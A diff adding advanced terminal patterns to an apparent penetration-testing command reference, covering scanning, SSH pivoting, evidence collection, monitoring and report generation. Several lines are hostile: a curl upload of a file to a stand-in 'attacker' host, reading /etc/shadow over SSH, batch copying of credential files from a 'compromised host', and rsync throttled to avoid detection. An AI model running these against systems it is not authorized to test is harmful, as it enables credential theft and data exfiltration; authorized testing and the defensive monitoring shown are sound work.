@@ -520,3 +520,586 @@ python3 -c "import impacket; print(impacket.__version__)"
 # Verify tool is in PATH
 which <tool> && <tool> --version
 ```
+
+---
+
+## Advanced Terminal Patterns
+
+### Process Management
+
+```bash
+# Find processes by port
+lsof -i :8080
+fuser 8080/tcp
+
+# Kill process tree
+kill -9 $(pgrep -f "process_name")
+pkill -f "pattern"
+
+# Monitor process resource usage
+top -p $(pgrep -f "nmap") -b -n 1
+
+# Background job management
+jobs -l
+fg %1
+bg %2
+disown %3
+```
+
+### File Transfer Methods
+
+```bash
+# Python HTTP server (quick file hosting)
+python3 -m http.server 8888 --directory /opt/tools
+
+# Upload via curl
+curl -T file.txt http://attacker:8888/upload
+
+# SCP with non-standard port
+scp -P 2222 file.txt user@target:/tmp/
+
+# Netcat file transfer
+# Receiver:
+nc -l -p 9999 > received.bin
+# Sender:
+nc target 9999 < payload.bin
+
+# Base64 encode/decode for copy-paste transfer
+base64 -w0 binary_file > encoded.txt
+base64 -d encoded.txt > binary_file
+```
+
+### Log Analysis Patterns
+
+```bash
+# Real-time log monitoring with filtering
+tail -f /var/log/auth.log | grep --line-buffered "Failed\|Accepted\|Invalid"
+
+# Extract unique IPs from logs
+grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' /var/log/auth.log | sort -u
+
+# Count failed login attempts per IP
+grep "Failed password" /var/log/auth.log | grep -oP '\d+\.\d+\.\d+\.\d+' | sort | uniq -c | sort -rn | head -10
+
+# Timeline reconstruction
+grep -h "$(date +%Y-%m-%d)" /var/log/*.log | sort -k1,2 | head -50
+```
+
+### Disk and Memory Operations
+
+```bash
+# Secure file deletion
+shred -vfz -n 3 sensitive_file.txt
+
+# Create RAM disk for temporary operations
+mkdir /tmp/ramdisk
+mount -t tmpfs -o size=512m tmpfs /tmp/ramdisk
+
+# Find large files
+find / -type f -size +100M 2>/dev/null | head -10
+
+# Disk usage by directory
+du -sh /* 2>/dev/null | sort -rh | head -10
+```
+
+### Cron and Scheduled Tasks
+
+```bash
+# List all cron jobs for all users
+for user in $(cut -f1 -d: /etc/passwd); do
+    crontab -l -u "$user" 2>/dev/null | grep -v "^#" | grep -v "^$" && echo "  ↑ $user"
+done
+
+# Check systemd timers
+systemctl list-timers --all
+
+# Monitor cron execution
+grep CRON /var/log/syslog | tail -20
+```
+
+### Terminal Multiplexing Patterns
+
+```bash
+# tmux: create engagement layout
+tmux new-session -d -s engagement \; \
+  split-window -h \; \
+  split-window -v \; \
+  select-pane -t 0 \; \
+  send-keys "tail -f evidence.log" C-m \; \
+  select-pane -t 1 \; \
+  send-keys "msfconsole" C-m \; \
+  select-pane -t 2 \; \
+  attach
+
+# tmux: save pane output to file
+tmux capture-pane -t engagement:0.0 -p > pane_output.txt
+
+# tmux: synchronize panes (type in all at once)
+tmux setw synchronize-panes on
+```
+
+---
+
+## Advanced Shell Scripting
+
+### Parallel Execution Patterns
+
+```bash
+# GNU Parallel — run nmap against multiple targets
+cat targets.txt | parallel -j 10 "nmap -sT -sV {} -oA scans/nmap_{//}_{/.}"
+
+# xargs parallel execution with progress
+cat targets.txt | xargs -P 8 -I{} bash -c \
+  'echo "[*] Scanning {}"; nmap -sT -p 80,443 {} > scans/{}.txt 2>&1'
+
+# Background jobs with wait and status collection
+declare -A PIDS
+for target in $(cat targets.txt); do
+  nmap -sT "$target" -oA "scans/$target" &
+  PIDS[$target]=$!
+done
+for target in "${!PIDS[@]}"; do
+  wait "${PIDS[$target]}" && echo "OK: $target" || echo "FAIL: $target"
+done
+
+# Parallel directory brute-force across multiple hosts
+parallel --bar -j 5 \
+  "gobuster dir -u http://{} -w /usr/share/wordlists/dirb/common.txt -o scans/gobuster_{}.txt" \
+  :::: targets.txt
+
+# Process substitution for parallel data feeds
+diff <(nmap -sT -p 80 target1 -oG - | grep open) \
+     <(nmap -sT -p 80 target2 -oG - | grep open)
+```
+
+### Error Handling Patterns
+
+```bash
+#!/bin/bash
+# Robust error handling template for pentest scripts
+set -euo pipefail
+trap 'echo "[!] Error on line $LINENO (exit $?)" >&2; cleanup' ERR
+trap 'cleanup' EXIT INT TERM
+
+EVIDENCE_DIR="evidence/$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$EVIDENCE_DIR"
+
+cleanup() {
+  echo "[*] Cleaning up temporary files..."
+  rm -f /tmp/scan_$$_* 2>/dev/null
+  # Preserve evidence even on failure
+  [ -d "$EVIDENCE_DIR" ] && echo "[*] Evidence preserved in $EVIDENCE_DIR"
+}
+
+safe_exec() {
+  local cmd="$1"
+  local timeout="${2:-60}"
+  local output
+  if output=$(timeout "$timeout" bash -c "$cmd" 2>&1); then
+    echo "$output"
+    return 0
+  else
+    echo "[!] Command failed (exit $?): $cmd" >&2
+    echo "$output" >> "$EVIDENCE_DIR/errors.log"
+    return 1
+  fi
+}
+
+# Usage
+safe_exec "nmap -sT -p 80 $TARGET" 120 | tee "$EVIDENCE_DIR/nmap.txt"
+```
+
+### Signal Traps and Graceful Shutdown
+
+```bash
+#!/bin/bash
+# Long-running scan with graceful interrupt handling
+RUNNING=true
+SCAN_PID=""
+
+handle_sigint() {
+  echo -e "\n[!] Interrupt received — stopping scan gracefully..."
+  RUNNING=false
+  [ -n "$SCAN_PID" ] && kill -TERM "$SCAN_PID" 2>/dev/null
+  # Save partial results
+  echo "[*] Partial results saved to $EVIDENCE_DIR/"
+  exit 130
+}
+
+handle_sigterm() {
+  echo "[!] SIGTERM received — emergency shutdown"
+  [ -n "$SCAN_PID" ] && kill -9 "$SCAN_PID" 2>/dev/null
+  exit 143
+}
+
+trap handle_sigint SIGINT
+trap handle_sigterm SIGTERM
+
+# Run scan with interrupt awareness
+while $RUNNING && read -r target; do
+  echo "[*] Scanning: $target"
+  nmap -sT "$target" -oA "$EVIDENCE_DIR/$target" &
+  SCAN_PID=$!
+  wait $SCAN_PID
+  SCAN_PID=""
+done < targets.txt
+```
+
+### Retry Logic and Exponential Backoff
+
+```bash
+# Retry with exponential backoff for flaky network operations
+retry_with_backoff() {
+  local max_attempts="${1:-5}"
+  local base_delay="${2:-2}"
+  shift 2
+  local cmd="$*"
+  local attempt=1
+
+  while [ $attempt -le $max_attempts ]; do
+    if eval "$cmd"; then
+      return 0
+    fi
+    local delay=$((base_delay ** attempt))
+    echo "[!] Attempt $attempt/$max_attempts failed. Retrying in ${delay}s..." >&2
+    sleep $delay
+    ((attempt++))
+  done
+  echo "[!] All $max_attempts attempts failed for: $cmd" >&2
+  return 1
+}
+
+# Usage
+retry_with_backoff 3 2 "curl -sS -o /dev/null -w '%{http_code}' http://$TARGET | grep -q 200"
+retry_with_backoff 5 1 "nc -zv $TARGET 22 2>&1 | grep -q succeeded"
+```
+
+### Named Pipes and Process Coordination
+
+```bash
+# Create named pipe for inter-process communication during engagement
+FIFO="/tmp/scan_pipe_$$"
+mkfifo "$FIFO"
+
+# Producer: feed discovered hosts to pipe
+nmap -sn 192.168.1.0/24 -oG - | grep "Up" | awk '{print $2}' > "$FIFO" &
+
+# Consumer: scan each discovered host
+while read -r host; do
+  echo "[*] Deep scanning: $host"
+  nmap -sT -sV "$host" -oA "scans/$host" &
+done < "$FIFO"
+wait
+rm -f "$FIFO"
+```
+
+---
+
+## Remote Operations
+
+### SSH Multiplexing
+
+```bash
+# Configure SSH multiplexing for fast repeated connections
+mkdir -p ~/.ssh/sockets
+cat >> ~/.ssh/config << 'EOF'
+Host pivot-*
+  ControlMaster auto
+  ControlPath ~/.ssh/sockets/%r@%h-%p
+  ControlPersist 600
+  ServerAliveInterval 30
+  ServerAliveCountMax 3
+EOF
+
+# Open master connection (subsequent connections reuse this)
+ssh -M -f -N pivot-host
+
+# Execute multiple commands over single connection
+ssh pivot-host "id && hostname && ip addr show"
+ssh pivot-host "cat /etc/shadow" > evidence/shadow.txt
+ssh pivot-host "netstat -tlnp" > evidence/listening.txt
+
+# Close master connection when done
+ssh -O exit pivot-host
+```
+
+### Rsync Patterns for Evidence Collection
+
+```bash
+# Sync evidence from remote target with compression
+rsync -avz --progress -e "ssh -p 2222" \
+  user@target:/var/log/ evidence/remote_logs/
+
+# Incremental sync with bandwidth limit (avoid detection)
+rsync -avz --bwlimit=500 --partial --progress \
+  user@target:/opt/app/data/ evidence/app_data/
+
+# Mirror remote directory structure for offline analysis
+rsync -avz --include="*/" --include="*.conf" --include="*.yml" \
+  --exclude="*" user@target:/ evidence/config_mirror/
+
+# Secure evidence transfer with checksum verification
+rsync -avz --checksum -e "ssh -o StrictHostKeyChecking=no" \
+  evidence/ user@collection-server:/cases/$(date +%Y%m%d)/
+```
+
+### Remote Command Execution Patterns
+
+```bash
+# Execute command on multiple hosts via SSH
+for host in $(cat targets.txt); do
+  echo "=== $host ==="
+  ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no "user@$host" \
+    "id; uname -a; cat /etc/os-release" 2>/dev/null || echo "FAILED: $host"
+done | tee evidence/multi_host_enum.txt
+
+# Parallel remote execution with GNU parallel
+parallel -j 10 --tag \
+  "ssh -o ConnectTimeout=5 {} 'sudo netstat -tlnp'" \
+  :::: targets.txt > evidence/all_listeners.txt
+
+# Remote script execution without file transfer
+ssh user@target 'bash -s' << 'REMOTE_SCRIPT'
+#!/bin/bash
+echo "=== System Info ==="
+uname -a
+echo "=== Users ==="
+cat /etc/passwd | grep -v nologin
+echo "=== SUID Binaries ==="
+find / -perm -4000 -type f 2>/dev/null
+REMOTE_SCRIPT
+
+# SSH ProxyJump for multi-hop access
+ssh -J user@jump1,user@jump2 user@internal-target "cat /etc/shadow"
+```
+
+### SCP and Secure File Operations
+
+```bash
+# Batch file collection from compromised host
+declare -a COLLECT_FILES=(
+  "/etc/passwd" "/etc/shadow" "/etc/hosts"
+  "/etc/crontab" "/var/log/auth.log" "/var/log/syslog"
+)
+for f in "${COLLECT_FILES[@]}"; do
+  scp -o StrictHostKeyChecking=no "user@target:$f" \
+    "evidence/$(echo $f | tr '/' '_')" 2>/dev/null
+done
+
+# Recursive collection with exclusions
+scp -r -o StrictHostKeyChecking=no \
+  "user@target:/etc/" evidence/etc_backup/ 2>/dev/null
+
+# Transfer through SOCKS proxy
+scp -o ProxyCommand="nc -X 5 -x 127.0.0.1:1080 %h %p" \
+  user@internal:~/secrets.db evidence/
+```
+
+---
+
+## System Monitoring
+
+### Real-Time Resource Tracking
+
+```bash
+# Combined CPU/memory/network monitoring with timestamps
+while true; do
+  echo "$(date +%H:%M:%S) | CPU: $(top -bn1 | grep 'Cpu(s)' | awk '{print $2}')% | \
+MEM: $(free -m | awk '/Mem/{printf "%d/%dMB (%.1f%%)", $3, $2, $3/$2*100}') | \
+NET: $(cat /proc/net/dev | awk '/eth0/{print "RX:"$2" TX:"$10}')"
+  sleep 5
+done | tee evidence/resource_monitor.log
+
+# Watch for new network connections in real-time
+watch -n 1 "ss -tnp | grep ESTAB | awk '{print \$4, \$5, \$6}' | sort"
+
+# Monitor disk I/O per process
+iotop -b -n 5 -d 2 -o | tee evidence/disk_io.txt
+
+# Track file descriptor usage (detect resource exhaustion attacks)
+watch -n 2 "ls /proc/*/fd 2>/dev/null | wc -l; echo '---'; lsof | wc -l"
+```
+
+### Process Forensics
+
+```bash
+# Capture full process details for suspicious PID
+PID=<suspicious_pid>
+echo "=== Process $PID ===" | tee evidence/proc_$PID.txt
+cat /proc/$PID/cmdline | tr '\0' ' ' | tee -a evidence/proc_$PID.txt
+echo "" | tee -a evidence/proc_$PID.txt
+ls -la /proc/$PID/exe | tee -a evidence/proc_$PID.txt
+cat /proc/$PID/environ | tr '\0' '\n' | tee -a evidence/proc_$PID.txt
+cat /proc/$PID/maps | tee -a evidence/proc_$PID.txt
+ls -la /proc/$PID/fd/ | tee -a evidence/proc_$PID.txt
+
+# Detect hidden processes (compare ps output with /proc)
+diff <(ps aux | awk '{print $2}' | sort -n) \
+     <(ls /proc | grep -E '^[0-9]+$' | sort -n)
+
+# Monitor process creation in real-time
+sudo auditctl -a always,exit -F arch=b64 -S execve -k process_creation
+sudo ausearch -k process_creation --start recent | tee evidence/new_processes.txt
+
+# Capture deleted but still-running binaries
+find /proc/*/exe -type l 2>/dev/null | while read link; do
+  target=$(readlink "$link" 2>/dev/null)
+  [[ "$target" == *"(deleted)"* ]] && echo "SUSPICIOUS: $link -> $target"
+done | tee evidence/deleted_binaries.txt
+```
+
+### Network Monitoring
+
+```bash
+# Capture traffic on specific interface with rotation
+sudo tcpdump -i eth0 -w evidence/capture_%Y%m%d_%H%M%S.pcap -G 300 -W 12 \
+  'not port 22' &
+
+# Monitor DNS queries in real-time (detect C2 beaconing)
+sudo tcpdump -i eth0 -n port 53 -l 2>/dev/null | \
+  awk '{print strftime("%H:%M:%S"), $0}' | tee evidence/dns_queries.txt
+
+# Detect new listening ports (baseline comparison)
+BASELINE="evidence/baseline_ports.txt"
+ss -tlnp | awk '{print $4}' | sort > /tmp/current_ports.txt
+[ -f "$BASELINE" ] && diff "$BASELINE" /tmp/current_ports.txt | grep "^>" \
+  && echo "ALERT: New listening ports detected!"
+cp /tmp/current_ports.txt "$BASELINE"
+
+# Connection rate monitoring (detect port scans)
+sudo conntrack -E -e NEW 2>/dev/null | awk '{
+  split($0, a, " ");
+  for(i in a) if(a[i] ~ /src=/) print strftime("%H:%M:%S"), a[i]
+}' | tee evidence/new_connections.txt
+
+# Bandwidth usage per connection
+sudo iftop -t -s 10 -L 20 -n -N 2>/dev/null | tee evidence/bandwidth.txt
+```
+
+### System Integrity Monitoring
+
+```bash
+# Create filesystem baseline for change detection
+find /etc /usr/bin /usr/sbin -type f -exec md5sum {} \; > evidence/fs_baseline.md5
+
+# Check for modifications against baseline
+md5sum -c evidence/fs_baseline.md5 2>/dev/null | grep "FAILED" | tee evidence/modified_files.txt
+
+# Monitor critical file changes with inotifywait
+inotifywait -m -r -e modify,create,delete,move \
+  /etc /usr/bin /usr/sbin /var/spool/cron \
+  --format '%T %w%f %e' --timefmt '%Y-%m-%d %H:%M:%S' \
+  | tee evidence/file_changes.txt &
+```
+
+---
+
+## Data Processing Pipelines
+
+### jq/yq Patterns
+
+```bash
+# Parse nmap XML output to JSON and extract open ports
+cat scan.xml | python3 -c "
+import xmltodict, json, sys
+data = xmltodict.parse(sys.stdin.read())
+print(json.dumps(data, indent=2))
+" | jq '.nmaprun.host.ports.port[] | select(.state[\"@state\"]==\"open\") | {port: .[\"@portid\"], service: .service[\"@name\"]}'
+
+# Merge multiple JSON scan results
+jq -s 'reduce .[] as $item ({}; . * $item)' scans/*.json > evidence/merged_results.json
+
+# Extract unique IPs from JSON results with deduplication
+jq -r '.. | .ip? // .target? // .host? // empty' scans/*.json | sort -u > evidence/all_ips.txt
+
+# Transform Nuclei JSON output to CSV
+cat nuclei_results.json | jq -r '[.info.severity, .host, .matched, .info.name] | @csv' \
+  > evidence/findings.csv
+
+# yq — parse and transform YAML configs
+yq '.services | keys' docker-compose.yml
+yq '.services[].ports[]' docker-compose.yml | sort -u
+yq -o=json docker-compose.yml | jq '.services | to_entries[] | {name: .key, image: .value.image}'
+```
+
+### CSV/JSON Transformation
+
+```bash
+# Convert nmap grepable output to CSV
+grep "Ports:" scan.gnmap | awk -F'[:/]' '{
+  host=$1; gsub(/Host: /,"",host); gsub(/ .*/,"",host)
+  for(i=1;i<=NF;i++) if($i~/open/) print host","$(i-1)","$(i+2)","$(i+4)
+}' > evidence/open_ports.csv
+
+# JSON to CSV with headers
+echo "ip,port,service,version" > evidence/services.csv
+jq -r '.hosts[] | .ip as $ip | .ports[] | [$ip, .port, .service, .version] | @csv' \
+  scan_results.json >> evidence/services.csv
+
+# CSV aggregation and statistics
+awk -F',' 'NR>1{count[$3]++} END{for(s in count) print count[s], s}' \
+  evidence/services.csv | sort -rn | head -20
+
+# Convert between formats with Miller
+mlr --icsv --ojson cat evidence/findings.csv > evidence/findings.json
+mlr --icsv --opprint --from evidence/services.csv stats1 -a count -f port -g service
+```
+
+### Log Parsing Pipelines
+
+```bash
+# Parse Apache access logs — extract attack patterns
+awk '{print $1, $7}' /var/log/apache2/access.log \
+  | grep -iE "union|select|script|\.\./" \
+  | sort | uniq -c | sort -rn | head -20 > evidence/attack_patterns.txt
+
+# Multi-stage log correlation pipeline
+# Stage 1: Extract failed SSH attempts
+grep "Failed password" /var/log/auth.log | \
+# Stage 2: Extract IPs and timestamps
+awk '{print $1, $2, $3, $(NF-3)}' | \
+# Stage 3: Count per IP per hour
+awk '{hour=substr($3,1,2); print $4, $1"-"$2"-"hour}' | sort | uniq -c | \
+# Stage 4: Flag brute force (>10 attempts/hour)
+awk '$1 > 10 {print "BRUTE_FORCE:", $2, $3, "attempts="$1}' \
+  > evidence/brute_force_detected.txt
+
+# Real-time log parsing with pattern matching
+tail -f /var/log/syslog | awk '
+/CRON/   {cron++}
+/sshd/   {ssh++}
+/kernel/ {kern++}
+NR%100==0 {print "Stats: cron="cron, "ssh="ssh, "kernel="kern}
+' | tee evidence/log_stats.txt
+
+# Extract and decode base64 payloads from web logs
+grep -oP 'base64[^&"]+' /var/log/apache2/access.log | while read -r encoded; do
+  decoded=$(echo "$encoded" | base64 -d 2>/dev/null)
+  [ -n "$decoded" ] && echo "PAYLOAD: $decoded"
+done | tee evidence/decoded_payloads.txt
+```
+
+### Structured Report Generation
+
+```bash
+# Generate markdown report from scan data
+generate_report() {
+  local output="evidence/report_$(date +%Y%m%d).md"
+  cat > "$output" << EOF
+# Penetration Test Evidence Report
+Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)
+
+## Hosts Discovered
+$(wc -l < evidence/all_ips.txt) unique hosts
+
+## Open Ports Summary
+$(awk -F',' 'NR>1{print $3}' evidence/services.csv | sort | uniq -c | sort -rn | head -10 | \
+  awk '{printf "| %s | %d |\n", $2, $1}')
+
+## Critical Findings
+$(jq -r 'select(.info.severity=="critical") | "- " + .info.name + " on " + .host' evidence/nuclei.json 2>/dev/null)
+EOF
+  echo "[*] Report generated: $output"
+}
+generate_report
+```
